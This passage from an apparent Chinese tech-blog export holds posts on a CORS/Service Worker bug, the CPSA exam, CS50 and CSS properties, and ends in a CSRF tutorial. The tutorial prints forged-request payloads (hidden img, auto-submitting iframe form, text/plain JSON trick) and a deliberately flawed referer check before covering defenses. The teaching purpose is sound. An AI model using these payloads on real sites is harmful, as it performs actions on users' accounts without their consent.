一樣，存在你的手機裡面，你光看這頁絕對分不出來這到底是 Native App 還是 PWA。 最後一張是你開啟這個 PWA 之後，會變成全螢幕，光看這個截圖根本就跟 Native App 沒兩樣。 總之呢，可以把 PWA 想成：現有的網站 + 新技術（Service Worker、manifest.json…），搭配起來就可以變 PWA 了。 對 PWA 簡單的介紹就到這裡，想看更多的可以參考 @arvinh 寫過的：Progressive Web App 會是未來趨勢嗎？或是當 React web app 遇上 Progressive web app。 對 PWA 來說，其實最重要的就是這個 Service Worker（以下簡稱 SW），Chrome 內建的 Lighthouse 就可以針對網頁給一個 PWA 的分數，SW 就是其中一個考量的項目，因為你必須實作 SW 才能快取檔案並且實作出離線也能開啟 App 這個功能。 下圖是 Lighthouse 會檢測的項目： 好，前情提要結束，可以來進入正題了。 我們的 PWA 該做的都做了，有註冊 SW，也有實作離線可以開啟的功能，可是卻發生了一件事，那就是在 Lighthouse 的檢測裡面，有一項永遠都過不了，那就是註冊 SW。 無論檢驗多少次，Lighthouse 都一直說我們的網站沒有註冊 SW。 超級無敵奇怪，我開無痕用乾淨的 Chrome 手動去測試，無論怎麼測我都確認一定有註冊 SW，可是 Lighthouse 怎麼測都說沒有。 那怎麼辦呢？ 幸好 Lighthouse 是開源的，而且有提供 CLI 的版本，你可以自己在你電腦上面跑。 於是我想說既然 Lighthouse 說沒有，那我們就來看看 Lighthouse 是怎麼檢測的好了，然後我就稍微研究了一下 Lighthouse 的原始碼，覺得檢測的方法看起來也沒什麼問題，於是我決定把 Lighthouse 改一下，讓它跑完測試的時候不會把視窗關起來，這樣我就可以看 console 有沒有什麼有用的資訊，看看註冊成功會印的訊息有沒有印出來。 我稍微改動了幾個地方： 增加設定檔，只跑 SW 的測試 跑完之後不會把 Chrome 關掉 在 SW 的檢查那邊印 log 如果有需要的，我更改的部分在這邊：改動的地方的 PR 改完以後重新跑一遍測試，那一刻，我終於想起了被 CORS 困擾下的恐懼： 撥雲見日既然有了一些線索就應該好好追查下去，從截圖裡面看起來，SW 是成功註冊了，但是在用 SW 快取檔案的時候碰到一些錯誤，所以好像連帶影響了整個測試。總之呢，只要把這個 CORS 問題解決掉就沒事了吧。 先幫大家再做個背景說明，我們這些靜態檔案都是放在 Amazon S3，然後前面再掛 Cloudfront，我們已經有乖乖按照 Amazon 的指示加上該加的東西，所以只要 request header 有 origin，response 就一定會有 CORS 的 header，所以一定不會發生這個錯誤。 而 SW 在快取檔案的時候是用 fetch，所以也一定會加上 origin 這個 header，沒理由出問題。 大概卡了一兩個小時還是還無頭緒，於是我決定看一下 network 的 tab，發現了更多線索： 下面這一張是從 SW 裡面發出的 request，header 裡面確實有 origin，可是 response 卻沒有 Access-Control-Allow-Origin！ 除此之外，發現更早以前也有一個相同的 request，因為這個 request 是由 &lt;script&gt; 發出的，所以不會帶上 origin，因此 response 也就沒有 CORS 的 header。 而這邊值得注意的事情是，第二個 response 是 from disk cache（雖然上面兩個都是，但那是因為我截圖的時候東西沒清空，事實上應該只有第二個是） 查線索查到這裡，大概有點頭緒了。 深入追查好，讓我先來解釋一下。 SW 所要快取的那個檔案是頁面會載入的其中一個 JavaScript，而因為頁面會載入，所以在 HTML 裡面我們放了一個 &lt;script&gt; 的 tag 來載入這個檔案，從上面的圖片看起來，瀏覽器先載入了這個 JavaScript 檔案，然後因為這個檔案不是用 ajax 發出，所以沒有 origin，根據 S3 的規定，也就自然沒有 Access-Control-Allow-Origin。 再來呢，SW 註冊成功，開始執行裡面的程式碼把我們預先準備好的清單給快取住，其中一個就是這個 JavaScript 的檔案，但是當我們用 fetch 來抓這個檔案時，瀏覽器直接用了快取住的前一個的 response（因為 URL、method 都一樣），而這個 response 是沒有 Access-Control-Allow-Origin 的！因此就跳出了我們最前面看到的跨網域的錯誤。 到這邊真相大白了，都是瀏覽器快取的問題。 那為什麼我之前自己測都測不出來呢？因為身為一個前端工程師，devtool 有把「Disable cache」打勾是很合情合理的事，所以我怎麼試都試不出來這個問題。 知道問題的成因之後就比較簡單了，拜了 Google 大神查到了這一篇 Chromium 的 ticket：CORS Preflight Cache Does not Consider Origin 裡面碰到的問題基本上跟我碰到的差不多，最後給的解法是 response 加上一個 Vary: Origin，讓瀏覽器知道如果 Origin 不一樣的話就不要用快取，可是我發現我們早就加了但不知道為什麼沒用。 除此之外也找到幾個類似的問題： Chrome S3 Cloudfront: No ‘Access-Control-Allow-Origin’ header on initial XHR request S3 CORS, always send Vary: Origin 後來採用裡面其中一個的解法：「既然 S3 要有 origin header 才能開啟 CORS，那就用 Cloudfront 傳一個固定的 origin 給它吧！這樣每個 response 都一定會有 Access-Control-Allow-Origin 了！」 可以參考這篇：AWS CloudFront + S3 + Allow all CORS，基本上就是調一個設定而已。 這招聽起來滿有效的，但其實不是最好的解法，感覺有點骯髒，畢竟 origin 這東西不是這樣用的，為了 S3 的機制硬要這樣做總覺得不是太好。 於是最後我就想到一個東西，同時也解決了心中的一個疑惑。 那就是在&lt;script&gt;加上 crossorigin=&quot;anonymous&quot;，讓&lt;script&gt;發出去的 request 也有 origin header！ 我以前就看到某些地方會加這個，但始終不懂為什麼要加，因為 script 本來就可以不限制網域，為什麼還要特地加一個 tag 讓它變成像 ajax 那樣的 request？ 但沒想到我居然被這個屬性幫助到了，一旦我加了這個，那 script 的載入就會附上 Origin，S3 就會回傳 Access-Control-Allow-Origin，也就不會碰到之後的跨網域問題了！ 至於這個屬性其他的功用，可參考：Purpose of the crossorigin attribute …? 總結要碰到我所碰到的這個問題，你必須同時滿足下面四個條件： 你把靜態檔案放在 S3 上面 你沒有勾選瀏覽器的 Disable cache 你用 script 跟 SW 載入同一個檔案 瀏覽器用快取的 script 的 response 回應 SW 的請求 只要任何一個條件沒有滿足，就不會碰到這問題。換句話說，要踩到這個坑其實也挺困難的。 但坑踩的越多就越強，解決了一個問題就代表你未來會碰到的問題又少了一個。解決掉這個 CORS 相關的問題，我想我以後應該不會再碰到相關的問題了…吧。","link":"/2018/08/18/cors-is-hard/"},{"title":"CPSA(CREST Practitioner Security Analyst) 資安分析師考試心得","text":"CREST 這個組織與 CPSA 這張證照在網路上可以找到的中文資料極少，在台灣算是比較冷門的一張證照，我是看了這篇：ECSA v10 等效申請CREST CPSA 資安分析師證照教學 &#x2F; ECSA with CPSA Equivalency Recognition Step 才對這個組織以及這張證照有基本的理解。 我在十二月跟另外一個同事去考了這張證照，都有順利考到，趁著剛考完沒多久，趕快來寫篇心得記錄一下。 CPSA 介紹還是不免俗地簡單介紹一下 CPSA 這張證照，全名為 CREST Practitioner Security Analyst，是 CRSET 的入門證照，官網有附上 CRSET 系列的圖，可以看到 CPSA 隸屬於滲透測試的分類底下，是這分類最初階的一張證照： 在行政院公布的資通安全證照專業清單裡面，也有出現這一張證照： 底下則是官網對於這張證照的介紹： The CREST Practitioner Security Analyst (CPSA) examination is an entry-level examination that tests a candidate’s knowledge in assessing operating systems and common network services at a basic level below that of the main CRT and CCT qualifications. The CPSA examination also includes an intermediate level of web application security testing and methods to identify common web application security vulnerabilities. 說明了 CPSA 是張入門的證照，而測驗內容則是基本的作業系統與網路相關安全知識，還有中階的 Web Security 相關知識。 考試的形式是 120 題的選擇題（有五個選項的單選題），總共有兩個小時的時間可以作答，需要去特定的考場（Pearson Vue test centres）考試。 CPSA 考試內容及準備CPSA 官網有提供考試的大綱，內容滿詳細的，但我比較喜歡這個 CPSA 的課程提供的簡化過的版本，稍微看過一遍之後會對考試的內容有基本的理解： Module 1: Soft Skills and Assessment Management Engagement Lifecycle Law and Compliance Scoping Understanding, Explaining and Managing Risk Record Keeping, Interim Reporting and Final Results Module 2: Core Technical Skills IP Protocols Network Architectures Network mapping and Target Identification Filtering Avoidance Techniques OS Fingerprinting Application Fingerprinting and Evaluating Unknown Services Cryptography Applications of Cryptography File System Permissions Audit Techniques Module 3: Background Information Gathering and Open Source Registration Records Domain Name Server (DNS) Google Hacking and Web Enumeration Information Leakage from Mail Headers Module 4: Networking Equipment Management Protocols Network Traffic Analysis Networking Protocols IPsec VoIP Wireless Configuration Analysis Module 5: Microsoft Windows Security Assessment Domain Reconnaissance User Enumeration Active Directory Windows Passwords Windows Vulnerabilities Windows Patch Management Strategies Desktop Lockdown Exchange Common Windows Applications Module 6: UNIX Security Assessment User Enumeration UNIX&#x2F;Linux Vulnerabilities FTP Sendmail&#x2F;SMTP Network File System (NFS) R-Services X11 RPC Services SSH Module 7: Web Technologies Web Server Operation &amp; Web Servers and Their Flaws Web Enterprise Architectures Web Protocols Web Markup Languages Web Programming Languages Web Application Servers Web APIs Web Sub-Components Module 8: Web-Testing Methodologies Web Application Reconnaissance Threat Modelling and Attack Vectors Information gathering from Web Mark-up Authentication Mechanisms Authorisation Mechanisms Input Validation Information Disclosure in Error Messages Use of Cross Site Scripting (XSS) Use of Injection Attacks Session Handling Encryption Source Code Review Module 9: Web Testing Techniques Web Site Structure Discovery Cross Site Scripting Attacks SQL Injection Parameter Manipulation Module 10: Databases Databases Microsoft SQL Server Oracle RDBMS MySQL 你會發現考試的內容滿廣的，幾乎什麼都有，什麼都考一點，所以剛開始時我會覺得比較難準備，不知道重點應該要放在哪邊。 因此我做的第一個準備是上網找一些考過的心得，都是英文的： CREST CPSA Exam Taking the CPSA (Crest Practitioner Security Analyst) Exam CREST Practitioner Security Analyst (CPSA) Exam - Study Guide 第三個寫得最詳細，而且裡面有附滿多參考資料跟資源的，我覺得滿有幫助。 底下是一些我自己準備的方向： 各種專有名詞的全稱，例如說 HTTP 或是 SSL 這些的全名是什麼 網路相關知識，包含 OSI 模型以及 IP, TCP, UDP, ICMP 這些 protocol 對常見加密演算法（DES、AES 以及 RSA 等等）以及 hash（MD5 跟 SHA1）的基本理解 DNS 相關知識 常用的服務對應到哪些 port 因為自認為自己對 web 比較熟悉，因此 web 的方向我沒有做什麼準備，想說直接正面迎戰。 CPSA 的及格線是答對 60% 的題目，我採取的策略是集中火力專攻上面那些部分，然後放掉我覺得比較難懂或是一直懶得看的一些主題，所以考試大綱上有些東西我連看都沒看過，考試的時候就是用猜的。 而我主要準備的資源也不是上面這些，雖然官方建議的書我有買，但看起來有點無聊而且內容滿多的，所以我主要準備是參考我同事找到的一個 GitHub 上有人整理過的資源，用 crest exam github 當關鍵字可以找到，上面有一些很實用的重點整理。 總之呢，我自己考完之後覺得如果你對網路相關知識已經滿熟悉的了（就計算機概論碰到網路相關問題都可以答對的話），又有基本的 web 知識，稍微唸個一兩週以後要考過應該不難。 CPSA 考試考試的報名費是 400 美金，大概台幣 11000 左右，台灣似乎只有兩個考場，一個在台北一個在高雄，台北的考場在信義區市政府捷運站附近：https://goo.gl/maps/2hCkEpEidb8WbYQw7 需要提前 30 分鐘報到，進入考場之後就是要先把東西全都收進去置物櫃裡面，不能再看書了，所以如果想看的話建議在考場附近看完再進去考場，接著就是報到的流程，記得要帶護照跟上面有簽名的證件（我是拿信用卡），要拍個照然後簽一些文件。 都弄好以後就會帶你進去測驗的地方，會有許多用木板隔著的個人電腦桌，就用那台電腦來考試，考的時候可以標記題目，之後檢查比較容易。 似乎是沒有限制一定要考多久，所以考完之後就可以直接用系統交卷了，我好像考了一小時到一個半小時左右，交完以後考場人員會來你的座位上帶你離開，先到外面置物櫃拿東西，東西拿完以後他會直接把測驗結果印給你，上面會寫說你的分數以及有沒有過關，還會有每個大分類的答題狀況。 我的話最後是低空飛過，驚險過關，接著大概隔個兩三天就會收到 CREST 寄來的證書了。 總結整體而言我覺得考試的難度不高但有點瑣碎，我自己網路知識基礎滿差的，所以在這邊掉了不少分數，因此我才說如果網路知識基礎 ok 的話，對於考試應該滿吃香的，至少那些題目都答得出來。 雖然目前在台灣這張證照的知名度不高，但聽說在國外一些地方有一定的知名度，若是有 OSCP 的話，還可以拿這張證照加上 OSCP 去換另一張 CRT 的證照，一魚兩吃。對我來說的話反正就先考起來，未來會不會用到我也不知道，但先準備好就是了。 如果大家有興趣的話可以去考考看，有什麼相關的問題也可以在底下留言，在能力範圍內我會盡量回答。","link":"/2021/12/15/crest-cpsa-prepare/"},{"title":"如海洋般的程式課程：CS50","text":"CS50 的全名是 Introduction to Computer Science，是一堂哈佛大學的通識課程在 edx 上面有開課，任何人都可以去修，甚至還有助教幫你改作業（只有程式作業，不包含其他像是紙本作業的那種題目） 我第一次聽到 CS50 這堂課，是經由這篇報導：CS50：一堂超過 800 個哈佛學生選修的「硬課」，魅力何在？一直到最近把這門課修完之後，才了解這門課厲害在哪裡。 先來回答標題的意思：如海洋般的程式課程。為什麼是海洋，因為這門課：又深又廣有多深多廣呢？我記下每一週的課程大綱跟作業，請你身邊有資工背景的朋友看看，就會知道我在說什麼了 第零週二進位、ASCII、RGB、二分搜尋法介紹基本程式語言：條件判斷、變數、迴圈、陣列、函式作業：用 scratch 寫一個程式 第一週開始介紹 C 語言，以及講解 compile 的觀念介紹各種形態，像是 double, float, int, bool, char, long long…介紹浮點數誤差與 overflow教你 command line 基本操作，像是 mv, ls, cd, make 等等作業：寫一個簡單的 C 程式（迴圈印出星星） 第二週介紹 function, string, array以及如何利用 argc, argv 傳入參數還有講到加密，像是 RSA教了 command line 的 Redirecting（&gt;）還有 Pipe（|）作業：字串處理，簡單加解密實作 第三週搜尋、排序（氣泡、插入、選擇、快排、合併）、big O遞迴、bit 操作GDB 的使用作業：實作O(n^2)的排序跟二分搜 第四週再次講解遞迴字串、指標、struct、bitmap 格式檔案處理（fprint&#x2F;fopen…）malloc，記憶體分配教你用 xxd 看檔案的 hex作業：給你 bitmap header 的文件，處理 bitmap 圖片，例如說放大兩倍 第五週深入講解記憶體與指標資料結構：linked list, queue, stack, tree, BST, tries, hashmap教你用 wget 抓檔案，以及如何寫 Makefile作業：實作字典樹或是 hashmap 第六週這週開始講跟網路有關的，包括：IP, IPv6domain, nslookup, traceroute, 封包ports, dns, vpn, http, request, response教你用chmod改檔案權限，以及curl抓網頁作業：用 C 寫一個 http server（的部份功能） 第七週chrome dev tool 的使用，像是看 html, request基本 html 與 css 教學php 簡介get&#x2F;post 參數介紹sql基本教學教你用apt-get安裝套件作業：完成簡單的 php 網頁以及與資料庫溝通 第八週示範重構程式碼，講解MVC的觀念教基本 SQL 語法有介紹到SQL Injection作業：串Google Map API，使用jQuery跟ajax做出互動性較高的網頁 第九週javascript 語法簡介json 格式講解DOM 模型event handler，事件機制（從這週以後沒有作業） 第十週探討資訊安全與隱私權像是密碼安全性（加密演算法、salting）智慧型電視釣魚信件Two-factor authenticationcookies, session, https也稍微講了一下語音辨識，像siri背後的原理 第十一週遊戲AI相關的介紹與無人車的介紹有提到：dfs, bfsminimaxevaluation functionalpha-beta 剪枝各種不同遊戲的ai特性還講了一點機器學習，像是netflix怎麼推薦影片給使用者 第十二週整個課程的回顧加上大家玩一點小遊戲這週沒什麼課程 我修這門課的時候，簡直驚呆了哇塞！居然教你怎麼寫Makefile，還教你用xxd看檔案，甚至給你bitmap的文件，要你按照這些格式把圖片讀取出來，然後放大之後寫回去！寫到我最崩潰的作業是 http server 那個，因為要用C做字串處理… 從上面洋洋灑灑十二週的課程介紹，就知道這門課真的又深又廣稍微整理一下，你修完之後可以學到： 寫程式的基本功：變數、陣列、判斷、迴圈、函式 你學會了指標！ 直接操作記憶體，了解電腦底層在做什麼 熟悉基本排序演算法法與資料結構 各種 command line 指令的使用（我覺得這一點超級實用） 網路的基本知識（ip, dns, server, port, request, response…） 後端程式語言 php 前端 html&#x2F;css&#x2F;javascript 資料庫 mysql 的使用與指令 資訊安全（加解密、sql injection, buffer overflow） 機器學習、人工智慧、語音辨識初步了解 我一直以來都是自學程式的，儘管上大學之後有修過幾門程式相關的課但都只是當做複習而已，沒有學到太多東西可是這次碰到這門課，真的讓我打從心底讚嘆不已他課程裡所介紹到的每一個東西都很實用，有些甚至連我也都是近期才會用的以前自學的時候甚至連 command line 都沒用過勒！因為根本也沒有機會用到 除此之外，儘管這門課講的內容有深度，但老師在上課的時候幽默風趣，可以把生澀的概念講的很生動例如說講到二分搜尋法，老師拿電話簿當做例子，接著直接從中間撕一半！又或是上到二進位，台上就有幾個燈泡，亮的就是1，暗的就是0，藉由這樣實體的互動加深印象 在課程教學上面，也有幾點是我很欣賞的第一，從 scratch 入門在修完 cs50 以後，我決定以後要教人程式設計，都要從scratch開始因為它視覺化，你可以很明顯看到程式的結構長怎樣；而且它速度快、內建資源完整你想做遊戲就拖拉幾個角色、定義一下事件就好我認為&#96;scratch是程式入門的最佳選擇 第二，把很難講解的概念先包裝起來像是字串，在C裡面其實就是char*，或者說是char形成的陣列可是在一開始，你要怎麼跟學生講解呢？於是他們就寫了一個string的type出來，把這些資訊隱藏起來，等之後上到陣列時，再跟學生講 還有scanf，會牽涉到pointer跟call by value之類的概念，這也不適合在一開始就講可是程式還有要有輸入阿，怎麼辦呢？於是他們就包成一個GetInt()的函式，把這些細節封裝起來 第三，雲端IDE要搭建開發環境不是件容易的事CS50 與 c9 合作，提供線上的 IDE你可以寫code，可以看檔案、可以用 command line 操作，一切作業都在上面完成超級方便！ 最後這一堂課真的是門硬課，但同時也是很扎實、很有用的課推薦給任何想要學寫程式的人 若是你正在修，卻找不到人討論的話，可以到這個臉書社團：cs50 中文討論區","link":"/2016/03/28/cs50-programming-course-like-ocean/"},{"title":"一些不太好記卻很好用的 CSS 屬性","text":"前言CSS 寫一陣子之後，大家對於常見的屬性應該都很熟了，例如說最基本的 display、position、padding、margin、border、background 等等，在寫 CSS 的時候不需要特別查什麼東西，很順的就可以寫出來。 這些屬性之所以常見，是因為許多地方都用得到所以常見，而有些 CSS 屬性只能使用在某些特定地方，或者是只有某個特定的情境之下才會出現。我很常會忘記這些沒那麼常用到的屬性，但在某些時候這些屬性其實特別重要。 因此這篇想來介紹一些我覺得不太好記但是卻很好用的 CSS 屬性，也是順便幫自己留個筆記。 input 的外框跟「那一根」的顏色比起 border，outline 是一個比較少出現的屬性，但這邊要特別提的是在 input 上的應用。瀏覽器預設的行為中，當你 focus 到 input 時外層會出現藍色的一圈： 那個藍色的就是 outline，可以透過 Chrome devtool 證實這件事： 所以如果不想要 outline 或是想改顏色，就用 outline 這個屬性去改就行了。 然後 focus 之後會出現的那個一直閃的那一根 | 叫做 caret，如果想改變顏色的話可以用 caret-color 這屬性去改： 點擊時的藍色框框我記得在手機上點擊一些東西的時候會出現一個藍色的外框還什麼之類的，但我剛剛怎麼試都沒有試出來，總之對應的屬性叫做 -webkit-tap-highlight-color，用這關鍵字查應該可以查到一些其他文章跟範例。 滑動時超出範圍（？）的移動不知道怎麼明確形容這個，直接上圖： 在手機上的時候有時候可以滑出超過頁面，就會看到背景的白色，或者是有些瀏覽器會有下拉重整的功能，當你在頁面最頂端還往下拉的時候就會變成重新整理。 如果想阻止這個行為，可以用 overscroll-behavior 這個屬性。 更詳細的介紹可以參考：Take control of your scroll: customizing pull-to-refresh and overflow effects 平滑捲動有許多網站都有一個功能，最常見的是部落格，在右側可能會出現文章的每一個段落標題，點下去之後就可以快速捲動到那個段落去。 如果什麼都沒有設定的話，就是點下去直接跳到那邊。但有一種東西叫做平滑捲動（smooth scroll），中間會有一些過場，會讓使用者知道是捲到那邊去的。 很久以前這功能可能需要 JS，但現在可以用 CSS 的 scroll-behavior: smooth; 來搞定（底下範例取自 MDN）： 載入新內容時的 scroll 位置許多網站都有捲到最底下的時候自動載入更多的功能，在載入更多的時候，你會預期使用者還是停留在同一個位置，不會因為載入更多就自動把捲軸往下捲之類的。 但有時候瀏覽器預設的處理方式不如預期，有可能你載入更多元素的時候，畫面並沒有停留在你想像中的位置。 這時候可以用 overflow-anchor 這個 CSS 屬性來調整這個行為，細節可以參考：CSS overflow-anchor属性与滚动锚定 滑一次就滑一個元素有時候我們會需要一個效果是使用者輕輕滑一下，就直接滑到下一個元素，而不是滑到任意地方，這可以透過 scroll-snap 相關的屬性來達成，像是這樣： 這感覺要做 carousel 的時候應該滿好用的，想看更多用法可以參考：Practical CSS Scroll Snapping，上面的範例也是來自於這篇文章。 手機上的 300ms 點擊延遲這應該不少人知道，在手機上面的點擊事件會有個大約 300ms 的 delay，也就是說你點下去之後要等 300ms 才會觸發 click 事件。會有這個 delay 是因為在手機上你可以雙擊來放大畫面 zoom in，所以在你點第一次的時候，瀏覽器不知道你是要點兩次還是只點一次，因此需要等一段時間。 這個 delay 在之前好像就已經被拔掉了，但如果你發現還有的話，可以用 touch-action: manipulation 這個 CSS 屬性來解決，這屬性可以設置停用一些手勢。 更多詳情可以參考 MDN，或者是這篇文章：300ms tap delay, gone away。 順帶一提，我是在 Facebook 的網站看到這個 CSS 屬性的。 font-smooth我是在 Create React App 預設的 css 裡面看到這個屬性的： body &#123; -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; &#125; 實際上在許多網站也可以發現這兩個屬性，查了一下發現是跟字體的渲染有關，例如說 antialiased 其實就是大家應該都聽過的「反鋸齒」。可以自己決定要用什麼方式來渲染字體。 更多細節可以參考： 了解CSS属性font-kerning,font-smoothing,font-variant What is font smoothing in CSS? 結語這篇簡單筆記一些我覺得比較難記的 CSS 屬性，因為不會很頻繁地去使用，所以等到真的要用的時候很容易忘記屬性名稱，如果關鍵字下得不對的話，很難找到這個屬性叫什麼。 會想寫這篇的原因之一也是因為有個朋友來問我某個行為怎麼解，原本以為無解或是一定要用 JS，後來發現用 CSS 其實就可以解了。因為知道那個屬性所以才解得出來，所以平時多看一些 CSS 屬性是很有幫助的，至少碰到問題的時候你會知道可以用 CSS 來解。 如果你也知道一些這類型的 CSS 屬性，歡迎分享給我。","link":"/2021/04/17/css-attrs/"},{"title":"讓我們來談談 CSRF","text":"前言最近剛好碰到一些 CSRF 的案例，趁著這次機會好好研究了一下。深入研究之後才發現這個攻擊其實滿可怕的，因為很容易忽略它。但幸好現在有些 Framework 都有內建防禦 CSRF 的功能，可以很簡單的開啟。 但儘管如此，我認為還是有必要瞭解一下 CSRF 到底在幹嘛，是透過怎樣的手段攻擊，以及該如何防禦。就讓我們先來簡單的介紹一下它吧！ CSRF 是一種 Web 上的攻擊手法，全稱是 Cross Site Request Forgery，跨站請求偽造。不要跟 XSS 搞混了，他們兩種是不同的東西，那到底什麼是 CSRF 呢？先從我自身的一個案例談起好了。 偷懶的刪除功能以前我有做個一個簡單的後台頁面，就想成是一個部落格吧！可以發表、刪除以及編輯文章，介面大概長得像這樣： 可以看到刪除的那個按鈕，點下去之後就可以把一篇文章刪掉。當初因為偷懶，想說如果我把這個功能做成 GET，我就可以直接用一個連結完成刪除這件事，在前端幾乎不用寫到任何程式碼： &lt;a href='/delete?id=3'>刪除&lt;/a> 很方便對吧？然後我在網頁後端那邊做一下驗證，驗證 request 有沒有帶 session id 上來，也驗證這篇文章是不是這個 id 的作者寫的，都符合的話才刪除文章。 嗯，聽起來該做的都做了啊，我都已經做到：「只有作者本人可以刪除自己的文章」了，應該很安全了，難道還有哪裡漏掉了嗎？ 沒錯，的確是「只有作者本人可以刪除自己的文章」，但如果他不是自己「主動刪除」，而是在不知情的情況下刪除呢？你可能會覺得我在講什麼東西，怎麼會有這種事情發生，不是作者主動刪的還能怎麼刪？ 好，我就來讓你看看還能怎麼刪！ 今天假設小黑是一個邪惡的壞蛋，想要讓小明在不知情的情況下就把自己的文章刪掉，該怎麼做呢？ 他知道小明很喜歡心理測驗，於是就做了一個心理測驗網站，並且發給小明。但這個心理測驗網站跟其他網站不同的點在於，「開始測驗」的按鈕長得像這樣： &lt;a href='https://small-min.blog.com/delete?id=3'>開始測驗&lt;/a> 小明收到網頁之後很開心，就點擊「開始測驗」。點擊之後瀏覽器就會發送一個 GET 請求給https://small-min.blog.com/delete?id=3，並且因為瀏覽器的運行機制，一併把 small-min.blog.com 的 cookie 都一起帶上去。 Server 端收到之後檢查了一下 session，發現是小明，而且這篇文章也真的是小明發的，於是就把這篇文章給刪除了。 這就是 CSRF，你現在明明在心理測驗網站，假設是 https://test.com 好了，但是卻在不知情的狀況下刪除了 https://small-min.blog.com 的文章，你說這可不可怕？超可怕！ 這也是為什麼 CSRF 又稱作 one-click attack 的緣故，你只要點一下就中招了。 你可能會說：「可是這樣小明不就知道了嗎，不就連過去部落格了？不符合『不知情的狀況』啊！」 好，那如果我們改成這樣呢： &lt;img src='https://small-min.blog.com/delete?id=3' width='0' height='0' /> &lt;a href='/test'>開始測驗&lt;/a> 在開啟頁面的同時，一樣發送一個刪除的 request 出去，但這次小明是真的完全不知道這件事情。這樣就符合了吧！ CSRF 就是在不同的 domain 底下卻能夠偽造出「使用者本人發出的 request」。要達成這件事也很簡單，因為瀏覽器的機制，你只要發送 request 給某個網域，就會把關聯的 cookie 一起帶上去。如果使用者是登入狀態，那這個 request 就理所當然包含了他的資訊（例如說 session id），這 request 看起來就像是使用者本人發出的。 那我把刪除改成 POST 不就好了嗎？沒錯，聰明！我們不要那麼懶，好好把刪除的功能做成 POST，這樣不就無法透過 &lt;a&gt; 或是 &lt;img&gt; 來攻擊了嗎？除非有哪個 HTML 元素可以發送 POST request！ 有，正好有一個，就叫做 form。 &lt;form action=\"https://small-min.blog.com/delete\" method=\"POST\"> &lt;input type=\"hidden\" name=\"id\" value=\"3\"/> &lt;input type=\"submit\" value=\"開始測驗\"/> &lt;/form> 小明點下去以後，照樣中招，一樣刪除了文章。你可能又會疑惑說，但是這樣小明不就知道了嗎？我跟你一樣很疑惑，於是我 Google 到了這篇：Example of silently submitting a POST FORM (CSRF) 這篇提供的範例如下，網頁的世界真是博大精深： &lt;iframe style=\"display:none\" name=\"csrf-frame\">&lt;/iframe> &lt;form method='POST' action='https://small-min.blog.com/delete' target=\"csrf-frame\" id=\"csrf-form\"> &lt;input type='hidden' name='id' value='3'> &lt;input type='submit' value='submit'> &lt;/form> &lt;script>document.getElementById(\"csrf-form\").submit()&lt;/script> 開一個看不見的 iframe，讓 form submit 之後的結果出現在 iframe 裡面，而且這個 form 還可以自動 submit，完全不需要經過小明的任何操作。 到了這步，你就知道改成 POST 是沒用的。 那我後端改成只接收 json 呢？聰明的你靈機一動：「既然在前端只有 form 可以送出 POST 的話，那我的 api 改成用 json 收資料不就可以了嗎？這樣總不能用 form 了吧！」 spring 的 document告訴你：這還是沒用的！ &lt;form action=\"https://small-min.blog.com/delete\" method=\"post\" enctype=\"text/plain\"> &lt;input name='&#123;\"id\":3, \"ignore_me\":\"' value='test\"&#125;' type='hidden'> &lt;input type=\"submit\" value=\"delete!\"/> &lt;/form> 這樣子會產生如下的 request body： &#123; \"id\": 3, \"ignore_me\": \"=test\" &#125; 但這邊值得注意的一點是，form能夠帶的 content type 只有三種：application/x-www-form-urlencoded, multipart/form-data 跟 text/plain。在上面的攻擊中我們用的是最後一種，text/plain，如果你在你的後端 Server 有檢查這個 content type 的話，是可以避免掉上面這個攻擊的。 我們舉的例子是刪除文章，這你可能覺得沒什麼，那如果是銀行轉帳呢？攻擊者只要在自己的網頁上寫下轉帳給自己帳號的 code，再把這個網頁散佈出去就好，就可以收到一大堆錢。 講了這麼多，來講該怎麼防禦吧！先從最簡單的「使用者」開始講。 使用者的防禦CSRF 攻擊之所以能成立，是因為使用者在被攻擊的網頁是處於已經登入的狀態，所以才能做出一些行為。雖然說這些攻擊應該由網頁那邊負責處理，但如果你真的很怕，怕網頁會處理不好的話，你可以在每次使用完網站就登出，就可以避免掉 CSRF。 或者呢，關閉執行 js 或把上面這些 pattern 的程式碼過濾掉不要執行，也是一個方法（但應該很難判定哪些是 CSRF 攻擊的程式碼）。 所以使用者能做的其實有限，真的該做事的是 Server 那邊！ Server 的防禦CSRF 之所以可怕是因為 CS 兩個字：Cross Site，你可以在任何一個網址底下發動攻擊。CSRF 的防禦就可以從這個方向思考，簡單來說就是：「我要怎麼擋掉從別的 domain 來的 request」 你仔細想想，CSRF 的 reuqest 跟使用者本人發出的 request 有什麼區別？區別在於 domain 的不同，前者是從任意一個 domain 發出的，後者是從同一個 domain 發出的（這邊假設你的 api 跟你的前端網站在同一個 domain） 檢查 Refererrequest 的 header 裡面會帶一個欄位叫做 referer，代表這個 request 是從哪個地方過來的，可以檢查這個欄位看是不是合法的 domain，不是的話直接 reject 掉即可。 但這個方法要注意的地方有三個，第一個是有些瀏覽器可能不會帶 referer，第二個是有些使用者可能會關閉自動帶 referer 的這個功能，這時候你的 server 就會 reject 掉由真的使用者發出的 request。 第三個是你判定是不是合法 domain 的程式碼必須要保證沒有 bug，例如： const referer = request.headers.referer; if (referer.indexOf('small-min.blog.com') > -1) &#123; // pass &#125; 你看出上面這段的問題了嗎？如果攻擊者的網頁是small-min.blog.com.attack.com的話，你的檢查就破功了。 所以，檢查 referer 並不是一個很完善的解法 加上圖形驗證碼、簡訊驗證碼等等就跟網路銀行轉帳的時候一樣，都會要你收簡訊驗證碼，多了這一道檢查就可以確保不會被 CSRF 攻擊。 圖形驗證碼也是，攻擊者並不知道圖形驗證碼的答案是什麼，所以就不可能攻擊了。 這是一個很完善的解決方法，但如果使用者每次刪除 blog 都要打一次圖形驗證碼，他們應該會煩死吧！ 加上 CSRF token要防止 CSRF 攻擊，我們其實只要確保有些資訊「只有使用者知道」即可。那該怎麼做呢？ 我們在 form 裡面加上一個 hidden 的欄位，叫做csrftoken，這裡面填的值由 server 隨機產生，並且存在 server 的 session 中。 &lt;form action=\"https://small-min.blog.com/delete\" method=\"POST\"> &lt;input type=\"hidden\" name=\"id\" value=\"3\"/> &lt;input type=\"hidden\" name=\"csrftoken\" value=\"fj1iro2jro12ijoi1\"/> &lt;input type=\"submit\" value=\"刪除文章\"/> &lt;/form> 按下 submit 之後，server 比對表單中的csrftoken與自己 session 裡面存的是不是一樣的，是的話就代表這的確是由使用者本人發出的 request。這個 csrftoken 由 server 產生，並且每一段不同的 session 就應該要更換一次。 那這個為什麼可以防禦呢？因為攻擊者並不知道 